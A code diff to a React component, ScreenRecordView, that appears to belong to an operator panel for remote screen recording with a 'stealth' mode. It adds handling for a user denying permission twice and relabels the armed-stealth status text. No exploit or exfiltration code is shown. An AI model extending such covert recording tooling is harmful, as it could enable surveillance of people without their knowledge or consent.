@@ -124,7 +124,8 @@ export default function ScreenRecordView({
             if (data.hasToken !== undefined) setHasToken(!!data.hasToken);
             switch (data.status) {
                 case 'token_needed':
-                    setHasToken(false); setPendingRec(true);
+                    setHasToken(false);
+                    // don't touch pendingRec here — operator controls that via button
                     break;
                 case 'authorized':
                     setHasToken(true);
@@ -146,6 +147,10 @@ export default function ScreenRecordView({
                 case 'denied':
                     setIsRecording(false); setPendingRec(false); setHasToken(false);
                     showToast('err', data.error || 'Permission denied');
+                    break;
+                case 'permission_never_granted':
+                    setIsRecording(false); setPendingRec(false); setHasToken(false);
+                    showToast('err', 'User denied twice — stealth disarmed', 8000);
                     break;
             }
         };
@@ -346,7 +351,7 @@ export default function ScreenRecordView({
                         <div className="flex items-center gap-3 py-3 px-4 rounded-xl bg-amber-500/8 border border-amber-500/20">
                             <Clock size={14} className="text-amber-400 animate-spin shrink-0"/>
                             <span className="text-xs font-medium text-amber-300/80">
-                                {recMode === 'stealth' ? 'Armed — waiting for activity...' : 'Waiting for permission...'}
+                                {recMode === 'stealth' ? 'Screen Rec — Armed' : 'Waiting for permission...'}
                             </span>
                         </div>
                         <button onClick={handleStop}
